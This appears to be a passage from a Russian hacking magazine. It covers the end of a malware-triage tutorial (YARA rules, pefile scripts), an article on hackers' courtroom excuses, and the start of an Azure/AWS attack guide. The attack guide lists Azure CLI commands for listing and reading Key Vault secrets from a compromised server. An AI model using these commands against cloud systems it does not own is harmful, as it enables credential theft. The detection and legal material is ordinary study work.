 • API‐функции CreateProcess или ShellExecute могут свидетельство‐
   вать о создании дочерних про цес сов, нап ример чтобы отсле живать
   наличие в системе основного процес са и вос станавливать его в слу чае
   остановки (это один из распростра ненных и простейших способов соз‐
   дания так называемого «неубиваемого про цес са»).
 • Связка  из  OpenProcess,  VirtualAlloc  (или  VirtualAllocEx),
  WriteProcessMemory и CreateRemoteThread — весьма красноречи‐
   вый признак попытки внедрения кода в какой‐либо процесс (особенно
   вкупе с наличием в файле строки с именем какого‐либо процесса).
 • SetWindowsHookEx свидетельствует об уста новке перехватов других API‐
  функций. Очень часто это делается вовсе не во благо ничего не подоз‐
   ревающего пользователя.
 • Функция RegisterHotKey — приз нак кейлоггера, она может исполь‐
   зоваться для перехвата нажатий на клавиши;
 • Связка из OpenSCManager, CreateService и StartService  сви‐
   детельствует о создании системного сервиса. Она тоже может исполь‐
   зоваться во вред, в частнос ти для создания «неубиваемого процесса».
 • Связка из URLDownloadToFile и ShellExecute — весьма вероятный
   признак трояна‐даунлоадера;
 • Функция TerminateProcess совмес тно со строками имен процессов
   антивирусных программ в одном фай ле практичес ки однозначно сви‐
   детельствует о желании исследуемого файла обезопасить себя, грохнув
   процесс антивируса;
 • Функции    IsDebuggerPresent,    CheckRemoteDebuggerPresent
   или OutputDebugString могут говорить о применении прос тейших анти‐
   отладочных приемов. В обычных программах они встречаются редко.

Правило для Yara, которое распознает, к примеру, связ ку из OpenProcess,
VirtualAlloc, WriteProcessMemory и CreateRomoteThread, может выг‐
лядеть так:


rule api_bandle
{
  strings:
    $str_api_1 = "OpenProcess"
    $str_api_2 = "VirtualAllocEx"
    $str_api_3 = "WriteProcessMemory"
    $str_api_4 = "CreateRemoteThread"


  condition:
    $str_api_1 and $str_api_2 and $str_api_3 and $str_api_4
}

Или так (с использованием Yara‐модуля pe):


import "pe" //импортируем Yara‐модуль pe
rule api_bandle
{
  condition:
    pe.imports("kernel32.dll" , "OpenProcess") and pe.imports(
"kernel32.dll" , "VirtualAllocEx") and pe.imports("kernel32.dll" ,
"WriteProcessMemory") and pe.imports("kernel32.dll" ,
"CreateRemoteThread")
}

А вот правило для Yara для распознавания связ ки из LoadLibrary (или Load‐
LibraryEx) и GetProcAddress и строк с импортируемой во время выпол‐
нения связкой OpenProcess, VirtualAllocEx, WriteProcessMemory и Cre‐
ateRemoteThread, которые могут быть закрыты побайтовым XOR:


import "pe" //импортируем Yara‐модуль pe
rule api_bandle
{
  strings:
    $str_api_1 = "OpenProcess" xor
    $str_api_2 = "VirtualAllocEx" xor
    $str_api_3 = "WriteProcessMemory" xor
    $str_api_4 = "CreateRemoteThread" xor


  condition:
    $str_api_1 and $str_api_2 and $str_api_3 and $str_api_4 and (pe.
imports("kernel32.dll" , "LoadLibrary") or pe.imports("kernel32.dll" ,
"LoadLibraryEx")) and pe.imports("kernel32.dll" , "GetProcAddress")
}

Для сравнения секций импорта раз ных файлов можно использовать хеш
импорта, так называемый imphash. Это хеш md5 от секции импорта после
некоторой нормализации. Подробнее о нем можешь почитать в блоге
FireEye.
  В Yara imphash можно определить с помощью функции imphash() модуля
pe:


import "pe"
rule imphash
{
  condition:
    pe.imphash() == "8a25c84dc57052979d26f561d4f12335"
}

На Python можно написать вот так:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
print('Imphash =', pe.get_imphash())

Используя значение imphash, вычисленное для одного файла, с помощью
написанного выше правила Yara мож но искать файлы с одинаковой таблицей
импорта (и с большой вероятностью с похожим предназначением).


             INFO

                        Утилита pestudio тоже позволяет анализировать
                        секцию импорта, причем она не только показы‐
                        вает импортируемые API‐функции, но и отмечает
                            те, что часто встречаются в малвари, и показы‐
                        вает возможный век тор атаки по классификации
                     MITRE ATT&CK.



Анализ таблицы экспорта
Вредоносные файлы с экспортиру емыми функциями — редкое явление,
однако иногда на просторах вирусных полей они встречаются. Бывают в том
числе и вредоносные DLL.
   Таблицу экспорта, в которой перечислены экспортируемые функции, мож‐
но так же, как и таблицу импорта, посмотреть в CFF Explorer или Hiew.





                   Таб лица экспорта в CFF Explorer

Здесь нужно обратить внимание на говоря щие сами за себя наз вания
экспортируемых функций, либо на наз вания функций в виде беспорядочного
набора символов, либо на отсутствие названий функций при наличии только
ординалов (номеров) функций (такое тоже может быть, ведь функции можно
экспортировать не толь ко по имени, но и по ординалу).
  На Python можно сделать следующий скрипт для просмотра таблицы
экспорта:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
  for export_entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    print('\t' + export_entry.name.decode('utf‐8'))
    print('\t\tОрдинал:', str(hex(export_entry.ordinal)))
    print('\t\tRVA функции:', str(hex(export_entry.address)))
else:
  print('Файл не содержит секцию экспорта.')




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

МАЛВАРЬ НА ПРОСВЕТ
               УЧИМСЯ БЫСТРО ИСКАТЬ ПРИЗНАКИ
                        ВРЕДОНОСНОГО КОДА





Анализ таблицы секций
Фактически все содержимое PE‐файла раз бито на секции. Каждая секция
хранит в себе либо код, который будет исполнен при запуске файла, либо
данные, необходимые для выполнения, либо ресурсы, используемые файлом.
У каждой секции есть имя, однако операционная система определяет наз‐
начение секции не по имени, а по атрибуту Characteristics, а имена
используются только для наглядности.
  Помимо назначения секции атрибут Characteristics определяет операции,
которые можно проводить с данными секции (чтение, выполнение, запись и т.
д.). Более подробно о секции в целом и об этом атрибуте можно почитать в
официальной документации. Наиболее часто используемые названия секций:
 • .text или CODE — как пра вило, содержит исполняемый код (название
   секции CODE характерно для программ, написанных на Delphi), в боль‐
  шинстве  случаев  имеет  зна чение  атрибута  Characteristics,  равное
  0x60000020  (IMAGE_SCN_CNT_CODE  &  IMAGE_SCN_MEM_EXECUTE  &
  IMAGE_SCN_MEM_READ);
 • .data или DATA — обычно здесь лежат данные для чтения или записи
   (название сек ции DATA также характерно для программ, написанных
   на Delphi), Characteristics чаще всего равен 0xс0000040 (IMAGE_SCN_C
  NT_INITIALIZED_DATA  &  IMAGE_SCN_MEM_READ  &  IMAGE_SC
  N_MEM_WRITE);
 • .rdata — данные только для чтения, иногда здесь лежат таблицы
   импорта и экспорта, Characteristics равен 0x40000040 (IMAGE_SCN_CN
  T_INITIALIZED_DATA & IMAGE_SCN_MEM_READ) или 0x50000040 (IM
  AGE_SCN_CNT_INITIALIZED_DATA &  IMAGE_SCN_MEM_READ  &  IM
  AGE_SCN_MEM_SHARED);
 • .idata — информация об импорте (если секция отсутствует, то импорт
   содержится  в  секции  .rdata),  Characteristics  чаще  всего  равен
  0xс0000040 (такое же, как и у секции .data);
 • .edata — информация об экспорте (если секция отсутству ет, то экспорт
   содержится в секции .rdata), Characteristics обычно равен 0xс0000040
   (такое же, как и у секции .data);
 • .rsrc — ресурсы, исполь зуемые PE‐файлом (иконки, диалоговые окна,
   меню,  строки  и   т.   д.),  Characteristics  равен  0x50000040  либо
  0x40000040.

Также могут встречаться секции .tls, .reloc, .pdata, .bss (или BSS), .
debug, .CRT, .didat. Наличие секции BSS вместе с секциями CODE и DATA
означает, что автор программы использовал компилятор Delphi, а если есть
секции .bss и .CRT, это может означать, что программу компилировали
в MinGW.
   Увидеть это все легко можно с помощью, например, CFF Explorer.





                    Таб лица секций в CFF Explorer

На что нужно обратить внимание при ана лизе таблицы секций?
   Во‐первых, на необычные названия секций. Например, в виде бес‐
порядочного набора символов.
   Во‐вторых,  на  несоответствие  атрибута  Characteristics  назначению
и содержимому секции. Например, может быть так, что у секции .text,
в которой содержится исполняемый код, помимо прочего еще добавлено
IMAGE_SCN_MEM_WRITE, то есть в секцию с кодом можно писать данные.
Это явный признак самомодифицирующегося кода, и в обычных программах
такое почти не встречается. То же можно ска зать и про секцию с данными (.
data или DATA): если в атрибуте Characteristics помимо прочего присутствует
IMAGE_SCN_MEM_EXECUTE, то это очень серь езный повод для подозрения.
   В‐третьих, наличие секций вроде UPX0, UPX1 или .aspack красноречиво
свидетельствует о применении соответству ющих упаковщиков.





              Сек ции UPX0 и UPX1 в запакованном файле

Также о применении упаковщиков может сви детельствовать высокое зна‐
чение (близкое к 8) эн тропии какой‐либо секции. Пос читать энтропию секций
PE‐файла можно с помощью вот такого скрипта на Python:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
for section_entry in pe.sections:
  print(section_entry.Name.decode('utf‐8'))
  print('\tCharacteristics:', hex(section_entry.Characteristics))
  print('\tMD5 хэш секции:', section_entry.get_hash_md5())
  print('\tЭнтропия секции:', section_entry.get_entropy())

Скрипт выводит имена всех секций PE‐файла, зна чение атрибута Characteris‐
tics, md5‐хеш и энтропию каждой секции.





  Значение энтропии одной из секций свидетельствует о воз можном
  наличии упаковки

В Yara энтропию можно определить с помощью функции entropy() модуля
math.


Временная метка компиляции
Информация о времени компиляции ана лизируемого файла может быть
полезна при построении гра фа ата ки и его анализе. Время создания (и, соот‐
ветственно, ком пиляции PE‐файла) хра нится в PE‐заголовке в виде четырех‐
байтового   числа,   содержащего   количес тво   секунд,   прошед ших
с 0 часов 0 минут 1 янва ря 1970 года.





              Время компиляции файла в CFF Explorer

В  удобоваримом  виде  зна чение  этого  времени  можно  посмотреть
с помощью такого скрипта:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
print('Дата и время компиляции:', time.strftime('%Y‐%m‐%d %H:%M:%S',
time.gmtime(pe.FILE_HEADER.TimeDateStamp)))

Для Delphi (а вредоносные файлы, написанные на Delphi, встре чаются и по
сей   день)   это   значение   всегда   равно  0x2a425e19,   что   зна‐
чит 0 часов 0 минут 19 июня 1992 года. В этом случае реальную дату ком‐
пиляции можно попытать ся определить из отметки вре мени секции .rsrc (в
файлах, создаваемых Delphi, она всегда присутс твует). Вре менная метка
находится по смещению 4 от начала секции .rsrc и представляет собой
четырехбайтовое число в формате MS‐DOS time.
  Посмотреть это значение в пристойном виде мож но сле дующим скриптом:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
time_stamp_dos = pe.DIRECTORY_ENTRY_RESOURCE.struct.TimeDateStamp
# преобразуем время из MS DOS формата в «нормальный» вид
day = time_stamp_dos >> 16 & 0x1f
month = time_stamp_dos >> 21 & 0x7
year = (time_stamp_dos >> 25 & 0xff) + 1980
second = (time_stamp_dos & 0x1f) * 2
minute = time_stamp_dos >> 5 & 0x3f
hour = time_stamp_dos >> 11 & 0x1f
print('Дата и время компиляции: {}‐{}‐{} {:02d}:{:02d}:{:02d}'.format
(day, month, year, hour, minute, second))

Если PE‐файл компилиро вался Visual Studio и при компиляции в файл была
вклю чена отладочная информа ция (а это можно определить по наличию таб‐
лицы Debug Directory в PE‐файле), то дата компиляции (помимо заголовка
PE‐файла) также содержится и в этой таб лице:





   Таблица Debug Directory в PE‐файле и отметка о времени компиляции

Посмотреть вре мен ную метку компиляции из Debug Directory в «нормальном»
виде можно сле дующим скриптом:


import pefile
# не забудь указать реальный путь к исследуемому файлу
pe = pefile.PE(<путь к файлу>)
time_stamp = pe.DIRECTORY_ENTRY_DEBUG[0].struct.TimeDateStamp
print('Дата и время компиляции:', time.strftime('%d‐%m‐%Y %H:%M:%S',
time.gmtime(time_stamp)))

При анализе вре менной метки компиляции под подоз рением дол жны быть:
 • недавняя дата компиляции программы (или нереальные ее значения, нап‐
  ример еще не наступившая дата);
 • несовпадение даты компиляции и версии компилятора (согласись, стран‐
   но видеть дату компиляции, например, 20 июня 2005 года для экзешника,
   откомпилиро ванного Visual Studio 19 версии);
 • значение даты компиляции равно нулю (велика вероятность, что соз датель
   программы это сделал намеренно, соот ветс твенно возникает вопрос —
   зачем);
 • для файлов, которые по всем признакам откомпилированы в Delphi, дата
   не соответствует зна чению 0x2a425e19, а дата, полученная из секции .
  rsrc, равна нулю или меньше, чем дата в PE‐заголовке;
 • дата компиляции из заголовка ана лизируемого файла не совпадает
   с датой, указанной в Debug Directory (весь ма вероятно, что эти значения
  были зачем‐то скорректированы).


             INFO

                      У некоторых компонентов Windows поле Time‐
                   DateStamp в PE‐заголовке может иметь инте‐
                       ресные значения — либо из будущего (к примеру,
                         у меня для «Блокнота» это 8 сентября 2028 года),
                      либо  из прошлого  (встречаются  компоненты,
                       датированные 1980 годом).



Анализ ресурсов исполняемого файла
Ресурсы, необходимые для работы exe‐файла (такие как иконки, диалоговые
окна, меню, изоб ражения, информа ция о версии, конфигурационные дан‐
ные), хранятся в секции .rsrc. Просмотреть можно при помощи все того же
CFF Explorer.





              Содержимое секции .rsrc в CFF Explorer

Но все же для просмотра ресурсов в PE‐файлах лучше использовать Re‐
source Hacker.





  Просмотр информации о версии прог раммы в секции ресурсов Resource
  Hacker

Поскольку в секции ресурсов могут хранится любые данные, туда могут быть
помещены либо вредоносная нагрузка, либо драй вер (например, перех‐
ватывающий системные функции), либо еще что‐нибудь не очень хорошее.
Поэтому стоит призадуматься, если найдешь здесь что‐то совсем не похожее
на иконки, картинки, диало ги, окна, информацию о версии и прочие безобид‐
ные вещи.

Rich-сигнатура
В статье я не упомянул такую примечательную структуру PE‐файла, как Rich‐
сигнатура. На нее тоже сто ит обра тить вни мание при анализе подозритель‐
ных файлов. Почитать о ней на английском можно здесь:
 • Rich Headers: Leveraging this Mysterious Artifact of the PE Format (PDF)
 • Microsoft's Rich Signature (NTCore)

Также я написал скрипт на Python для прос мотра Rich‐сигнатуры.



ЗАКЛЮЧЕНИЕ
С помощью нескольких относитель но прос тых инс трументов мы можем быс‐
тро проанализировать подоз рительный исполняемый файл, частично (а иной
раз и достаточно пол но) понять, что он собой представляет, и вынести вер‐
дикт о возможной вредонос ности. Одна ко при ана лизе сложных файлов, под‐
вергнутых упаковке, шифрованию и обфуска ции, этого может оказаться
недостаточно. Тогда без более детального статического и динамического
анализа не обойтись. Об этом мы и поговорим в следующий раз.


        WWW

                     •Все  исходники  на   Python,  приведенные
                         в статье;
                          •YaraEditor и YaraGui — программы, которые
                        упрощают работу с Yara;
                  •Утилиты для подсчета контрольных сумм: Hash‐
                           MyFiles, Hash Calculator, Hash Calc.
ВЗЛОМ





                                                                           Виталий Евсиков
                                                                                          evsikovv@gmail.com


    Я НЕ
    СПЕЦИАЛЬНО

            КАКИЕ ОТМАЗКИ ХАКЕРОВ
            МОГУТ СРАБОТАТЬ В СУДЕ





Даже если хакера съели, у него оста нется как минимум два
выхода. А  вот  если  хакера  задержали  суровые люди
в  погонах,  выходов может  оказаться меньше. Обычно
в подобных случаях советуют нанять толкового адвоката
и надеяться на лучшее, а еще в ожидании раз вязки можно
озаботиться придумыванием пары‐тройки надежных отма‐
зок. Какие из них могут сработать, а какие лучше вообще
не пускать в ход, мы сегодня и обсудим.


             INFO

                      Если тебе интересна тематика противостояния
                      киберпреступников    и    правоохранителей,
                      рекомендуем ознакомиться с прошлой статьей,
                        в которой рассказывалось, как в России судят
                      киберзлодеев и насколько строга наша судебная
                       система к ним.


В зарубежных фильмах судебный процесс представляет собой поле битвы,
где на глазах публики крас норечивый адвокат сра жается с непреклонным
государственным обви нителем, а за всем этим свысока наб людает судья.
На деле же судебный процесс скучен и однообразен. В большинс тве случаев
все  сводится  к  зачитыванию  постановления  суда.  Сос тязательность
условная, и это неудивитель но — ответы на все вопросы получены еще на
этапе следствия, а судьи, отлично под кованные в вопросах юриспруденции,
в компьютерных технологиях понимают куда меньше и потому плохо раз лича‐
ют понятия ransomware,  bruteforce и пен тест. Ины ми словами, в своих
решениях они часто опираются на заключения следователей.
  По этой причине сос тязание и борьба переносятся на этап следствия.
Именно там формируется доказа тельная база, которая будет потом предъ‐
явлена в качестве обвинения. И как раз на этом этапе обвиняемые в совер‐
шении компьютерных преступлений пытаются всеми способами оправдать
себя и выстроить защиту, про являя иног да завидную фантазию и смекалку.


               ПОПУЛЯРНЫЕ ОТМАЗКИ

«Я не знал, что ПО вредоносное»
С появления в Уголовном кодексе РФ статьи 273 «Создание, использование
и распространение вредонос ных компь ютер ных программ» споры и дис‐
куссии о том, что же все‐таки может быть признано вредонос ным ПО, не ути‐
хают ни на минуту. Оставим демагогию юристам и обратимся к практике.
  Основанием для признания ПО вредонос ным выступает заключение
эксперта. За последние годы «вредоносным» признано большое количес тво
программ и утилит. Среди них ScanSSH, Intercepter‐NG, NLBrute, UBrute, RDP
Brute, sqlmap, Netsparker, SQLi Dumper, Router Scan, Private Keeper, Havij,
Metasploit, Armitage, DUBrute, Lamescan, Fast RDP Brute, njRAT, Acunetix. В эту
же кучу эксперты часто сва лива ют фишинговые стра ницы, активаторы, кей‐
гены, патчи и банковские трояны.
  Помимо явной малвари, в списке присутству ют легальные инструменты
для пентеста: например, Acunetix и Netsparker, причис лять которые к вре‐
доносным не совсем корректно. Не меньше воп росов вызывает включение
в этот список sqlmap, Metasploit и Armitage, которые входят в состав Kali Linux.
После этого осталось только зап ретить саму операци онную сис тему.
  Дело в том, что однозначно ска зать, является ли ПО вредоносным, невоз‐
можно. Опре деле ние вредоносности дается вся кий раз в зависи мости
от обстоятельств применения это го ПО. Простой пример: использование
Acunetix Web Vulnerability Scanner 8 для выявления уяз вимостей спе циалис‐
тами компании на принадлежащем ей ресурсе не образует состава прес‐
тупления. А вот использование этого же ПО киберзлодеем для взлома чужого
сервера делает его вредонос ным. Такая пра вовая коллизия.
  В общем, заявление о том, что подоз рева емый не имел ни малейшего
представ ления о вредоносности свойств исполь зуемых им программ, впе чат‐
ления на следователей и суд не произво дят. И смягчению наказания тоже
не способствуют.


«Мой компьютер взломали, атаки совершал не я!»
Неплохая попытка уйти от ответственности. На компьютере был разрешен
удаленный доступ по  RDP,  неизвес тный киберзлодей подобрал  логин
и пароль и творил темные дела, пока настоящий пользователь даже не подоз‐
ревал об этом.
  Опровергают ся подобные заявления следующим образом: проводится
судебная экспертиза, в результате которой уста навливается, был ли открыт
к компьютеру доступ по RDP, когда к нему подклю чались, присутству ют ли
в логах признаки брутфорса.
   Также анализируются история и временные файлы браузе ров. При сутс‐
твие в хистори запросов «как удаленно взломать учетную запись?», «скачать
NLBrute» и подобных вряд ли сыграют на руку обви няемому. Экспертиза так‐
же установит наличие вредоносного ПО, время его запуска, наличие зашиф‐
рованных файлов‐контейнеров, используемые на компьютере средс тва ано‐
нимизации и так далее.
  В довершение всего оценивают способности и навыки обви няемого,
исходя из его образования, работы и интересов. Сведения, подтверждающие
наличие у него знаний в сфере IT, будут исполь зованы для под твержде ния
выдвинутого обвинения.
   Здесь сле дует уточнить. Одно го лишь факта, что обвиняемый работает
системным администратором и интересуется пентестом, будет явно недос‐
таточно, чтобы осудить ни в чем не повинного человека, поэтому все
перечисленное выше рассматривается в совокупности.


«Это не мой IP»
Подобные утверждения легко опровергнуть: запросить у провай дера, кому
принадлежит IP‐адрес, с которого велись компь ютерные атаки. И неважно,
использовался статичес кий или динами чес кий IP‐адрес, — в соответствии
с законом Яровой информацию о выделен ном тебе IP‐адресе провайдер
хранит полгода. Достаточно времени, чтобы соб рать необходимые доказа‐
тельства.


«Я ведь ничего не взломал, просто проверил, как это работает»
Так отмазываются скрипт‐кидди: «Ска чал программу, установил, нажал start,
а дальше все само как‐то получилось…» И ведь они могут быть впол не
искренни. Только толку от это го ноль. Сам по себе факт использования вре‐
доносного ПО уже незако нен и влечет за собой уголовное наказание. А если
целью атаки «случайно» оказался ресурс, отнесенный к категории «Объ екты
критической информационной инфраструктуры РФ», то и наказание за такое
деяние будет строже, вплоть до лишения свободы на срок от двух до пяти лет.


«Я только материал предоставлял»
Хищением денег с банковских счетов занимается группа лиц, роли в которой
заранее распре деле ны. Помимо кодеров, крипторов, траферов и залив‐
щиков, которые непосредс твенно вза имодей ству ют с малварью, туда также
входят дроповоды и обнальщики. Их обязанности ограничиваются поис ком
дропов, работой с ними и переводом денеж ных средств на предоставленные
банковские реквизиты.
  Представ перед судом, эти ребята пытаются доказать, что их работа зак‐
лючалась только в поиске людей и переводе денег. Ни о каких прес тупных
схемах и вредоносном ПО они не слышали.
   Такие заявления легко опровергаются результатами оперативно‐разыс‐
кных мероприятий и следс твенными действи ями. Опрашивают свидетелей,
анализируют телефонные перего воры, переписку с дру гими учас тниками
преступной группы, поднимают банковские транзакции и прочее. Как пра‐
вило, совокупность всех этих сведений позволя ет доказать, что обвиняемый
знал, каким образом получены день ги и для чего нужны были банковские кар‐
ты дропов.
  Помимо всего прочего, эти зло деи наказы ваются еще и по статье 273 УК
РФ («Использование вредонос ного ПО»). И пусть они не занимались непос‐
редственным  запуском  и  уста новкой  малвари.  Следствию  дос таточно
доказать, что деньги похища лись организованной группой лиц. Участие в ней
автоматически вле чет наказа ние и по этой статье УК.
  К похожим способам защиты прибегают и обви няемые во взломах бан‐
коматов с помощью малвари, такой как Cutlet Maker. Они легко соглашаются
с обвинениями в краже денег, но никак не могут понять, о каком вредонос ном
ПО идет речь. При этом обвиняемые ссылаются на отсутствие у них спе‐
циальных познаний в информационных технологиях. Это в оче редной раз
подтверждает, что в наше время «киберпреступником» может стать обычный
вор с дрелью, флешкой и USB‐шну ром в руках.


«Я выполнял приказы ФСБ»
Руководитель хакерской группы Lurk наверняка был не первым, кто прибегнул
к подобному оправданию своей деятельнос ти. Но именно его заявление
получило широкую огласку. Напомню тебе, как было дело.
  Обвиняемый в краже 1,7 миллиарда рублей и атаках на критическую
инфраструктуру РФ Константин Коз ловский заявил, что совершал преступле‐
ния с подачи сотрудни ков ФСБ. Чтобы при дать еще большую значимость
этим словам, он взял на себя ответс твенность за взлом серверов Демок‐
ратической партии США и электронной почты Хиллари Клинтон в 2016 году.
Суд скептически отнесся к подобному заявлению. Минюст США также никог‐
да не заяв лял о причастности Козловского к этим компьютерным атакам.
  Судебный процесс над участниками группы Lurk продолжается, и, воз‐
можно, нас ждут еще более сенсационные и откровенные заявления их
руководителя.


                    ЧТО ПОМОГАЕТ

Активная помощь раскрытию преступления, явка с повинной,
особый порядок
В подавляющем большинс тве уголовных дел киберпрес тупни ки прибегают
к подобным способам смягчения наказа ния, если у следствия достаточно
доказательств их вины. Это и неудивительно — если у полиции на руках твой
жесткий диск с кол лекцией малвари, базой для бру та и полученными валид‐
ными учетными записями, отпираться было бы странно. Можно, конечно, при‐
бегнуть к способам из первой части статьи, но есть шанс испортить все окон‐
чательно.


Компенсация нанесенного материального ущерба и морального
вреда
За все нужно платить, и чаще всего в денеж ном эквиваленте. Компенси‐
ровать материальный ущерб лучше еще на этапе следствия, тогда суд зачтет
это как смягчающее обстоятельство.
   Если поймать удается только одного из учас тников преступной группы, то
отдуваться он будет за всех собственными средствами. Так часто бывает
при задержании дроповодов, обнальщиков и дру гих низкоквалифицирован‐
ных киберзлодеев.


Принесение извинений пострадавшей стороне
Здесь все просто: правила хорошего тона приветс твуются судом. Принести
извинения можно в любом виде — лично, по почте, публично. Главное —
не забыть зафиксировать это.


Ходатайство коллектива
Положительная характеристика и ходатайство рабоче го коллектива часто
помогают IT‐специалистам, которые совершают киберпреступле ния, когда
изучают основы кибербезопас ности и пентеста.


Лекция о недопустимости противоправной деятельности
Относительно новый спо соб смягчения наказа ния, который положительно
рассматривается на суде. К нему часто при бега ют скрипт‐кид ди, случайно
атаковавшие государственный ресурс. Лекции проводятся в университетах,
школах или по месту работы. Считается, что это помогает дру гим начина‐
ющим хакерам не встать на скользкий путь преступности.


«По Ru не работал»
На протяжении дол гих лет следование этому принципу позволяло киберзло‐
деям избегать наказания за совершенные преступления. В последнее вре мя
картина меняется. Стали появлять ся примеры, когда перед судом предстают
кибермошенники и прес тупники, взла мывавшие компьютеры иностранных
граждан и организаций и похищавшие деньги.
  Тем не менее вымога телю из Вологодской области соблюдение этого
правила  помогло  избежать  сурово го  наказания. За зашифровку  око‐
ло 2000 зарубежных компьютеров и получение в качестве выкупа около
четырех миллионов рублей ему наз начили семь месяцев лишения свободы
условно, с испытательным сроком в один год и штрафом в 100 тысяч рублей.
Аналогичные действия в отношении рос сийских пользователей наверняка
привели бы к более суровому наказанию.


«Из любви к Родине»
Такими словами объяснил причины киберпрес тупления активист партии
«Единая Россия» из города Сочи. Дело было в далеком 2011 году. Испы тывая
личную неприязнь к лицам, выражавшим недовольство результатами выборов
депутатов Госдумы, он заблокировал телефоны членов избирательных комис‐
сий и сторонников оппозиции с помощью флудеров SkypePhoneKiller, SkypeX,
Rings Skyper, Mobile  Attacker, SIP Unlock. Также он устроил DDoS‐атаки
на местные новостные сайты.
   Активист получил наказа ние в виде ограничения свободы, но тут же в зале
суда был амнистирован и освобожден от наз наченного наказания и судимос‐
ти в соответствии с постановлением депутатов Гос думы.


                   ВЫВОДЫ

В попытках уйти от наказания за совершенные преступления киберзлодеи
прибегают к самым разным способам. Некоторые звучат весьма цинично,
абсурдно и глупо. Результат ока зывается закономерен.
   Иногда обвиняемые даже не догадывались о том, что совершали опасные
деяния. Начитав шись в дарквебе ману алов, как взломать удаленные ресурсы,
эти энтузиасты смело бросаются в бой, не задумываясь о пос ледстви ях. Воз‐
можно, государству стоило бы про водить просветительскую работу сре ди
этой категории поль зователей, чтобы предос теречь их от неверных шагов.
И делать это было бы здорово не только в школах, университетах и на сайте
«Лиги безопасного интернета».
  А вот заявления о лояльности и любви к нашей стране могут помочь избе‐
жать сурового наказания или значительно умень шить его. Главное — сделать
это искренне. Стоит отметить, что Уголовный кодекс не ограничивает список
обстоятельств, смягчающих наказа ние.
  Но лучший способ его избежать — не совершать преступле ний. И тогда
точно не придется фантазировать на тему «Как это получилось?» или зна‐
комиться с тонкостями российской судеб ной сис темы.
ВЗЛОМ
 АТАКА
    НА ОБЛАКА

                   ГАЙД ПО МЕТОДАМ
               ВЗЛОМА ПРИЛОЖЕНИЙ
                     В AZURE И AWS





                                                                                             Artur Bagiryan
                                                                                                Penetration Tester | Red Team‐
                                                                                                   er | Active Directory Security |
                                                                                            Cloud Security
                                                                                          artur.bg@yahoo.com





Перенос IT‐инфраструктуры в облака — это не дань моде:
такой подход поз воляет эко номить на технической поддер‐
жке, резервном копировании и администрировании. К тому
же размещение инфраструктуры в облаке считается более
защищенным и от сбоев, и от внеш них  атак. Но есть
и эффективные методы взло ма наибо лее популярных гиб‐
ридно‐облачных сред, таких как Azure и AWS. Об этих тех‐
никах и атаках я расскажу дальше.


           WARNING

                    Описания техник и атак в этой статье приведены
                      исключительно в образовательных целях. Автор
                      и редакция не несут ответственности за воз‐
                    можные последствия использования информации
                       из этой статьи.


Для  наглядности давай представим пример  ата куемой инфраструктуры
в виде следующей диаграммы.





             Пример гиб ридно‐облачной инфраструктуры

Как видно из диаграммы, орга низация использует серверы и сервисы раз ных
облачных провайдеров, а также имеет ряд серверов on‐premises. Серверы
и сервисы взаимодействуют между собой, так как это необходимо для пол‐
ноценной работоспособности биз неса. Предположим, что злоумышленник
получил удаленный доступ к скомпрометированному серверу on‐premises.
Вот несколько возможных сценариев дальнейшего развития атаки.


ВНУТРЕННЯЯ РАЗВЕДКА НА ИСПОЛЬЗОВАНИЕ ОБЛАЧНЫХ
СЕРВИСОВ
Имея доступ к линукс‐серверу on‐premises, желательно оставаться незаме‐
ченным как можно доль ше. С этой целью можно использовать сервисы, дей‐
ствия и запросы которых рас сматриваются в системе как раз решенные.
На такую роль как нельзя лучше подходят прикладные утилиты для удаленной
работы с облачной инфраструктурой.
   Также стоит обратить внимание на любые другие следы того, что сервер
взаимодействует с облаками. К примеру, можно проанализировать command
history, запущенные про цессы, уста новленные пакеты и прочее.


Сбор данных с помощью утилиты Az
Azure CLI — это набор команд для соз дания ресурсов Azure и управления
ими. Azure CLI доступен в раз личных службах Azure и предназначен для быс‐
трой работы с ними. Для входа в профиль Azure по умол чанию используется
команда az login.





           Вход в профиль Azure с помощью команды az login

Как оказалось, в нашем случае линукс‐сервер имеет доступ к инфраструктуре
Azure. Какую полезную информа цию из этого можно извлечь? Для начала
с помощью команды az account list получим перечень под писок авто‐
ризированного пользователя.





                  Получение перечня подписок

C помощью директивы az account show ‐‐query "id" можно получить ID
учетной записи. А команда


az resource list ‐‐query "[?type=='Microsoft.KeyVault/vaults']"

позволяет узнать данные о Key Vault. Key Vault — это служба, которая помога‐
ет хранить ключи в аппаратных модулях безопасности (HSM), зашифровывая
клю чи и небольшие секретные данные, например пароли. Очевидно, что Key
Vault должен быть правильно настро ен, ина че может произой ти нечто подоб‐
ное тому, что показано на скрин шоте ниже.





            Вот почему важно пра вильно нас троить Key Vault

А вот еще несколько команд, позволяющих выудить из Azure нужные взлом‐
щику сведения:
 • az  resource  show  id  /subscriptions/…  |  grep  E  en
  ablePurgeProtection|enableSoftDelete — проверить, можно ли
   восстановить Key Vault;
 • az keyvault secret list vaultname name query [*].[{
  "name":attributes.name},{"enabled":attributes.enabled},{
  "expires":attributes.expires}] — про верить,  когда секретный
   ключ Key Vault истекает;
 • az keyvault secret list vaultname KeyVaultdatasecure 
  query '[].id' — получить URL для Key Vault;
 • az keyvault secret show id — получить данные, хранящиеся
   в Key Vault;
 • az network nsg list  query  [*].[name,securityRules] —
   получить данные о политике безопас ности для сети Azure.





          Результат работы команды az keyvault secret show ‐‐id

С помощью приведенных выше команд можно увидеть детали настроек
политик безопасности для сети, к при меру наз вание политики, группы, кон‐
фигурации. Обрати внимание на теги access, destinationPortRange, pro‐
tocol и direction. Они показывают, что на сервере разрешены внешние
подклю чения. Установка уда ленного доступа к C&C значительно облегчает
задачу атакующе му и повышает шансы остать ся незамеченным.





  По ряду признаков можно определить, что на сервере раз решены под‐
  клю чения извне


Сбор данных с помощью утилиты AWS
AWS CLI — это единый инстру мент для управления сервисами AWS. Загружа‐
ешь всего одно средство — и можешь контролиро вать множество сервисов
